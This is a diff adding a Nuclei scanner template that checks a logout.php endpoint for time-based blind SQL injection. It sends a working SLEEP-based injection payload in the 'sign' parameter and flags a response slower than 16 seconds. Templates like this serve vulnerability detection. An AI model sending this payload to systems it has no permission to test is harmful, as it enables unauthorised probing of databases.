@@ -1,0 +1,25 @@
+id: sql-injection-test
+
+info:
+  name: SQL Injection Test in logout.php
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template tests for SQL injection vulnerability in the `logout.php` endpoint by injecting a payload that introduces a sleep condition.
+  tags: sqli,critical
+
+http:
+  - raw:
+      - |
+        GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(16)))Vgsc)--+qhh HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>16000"
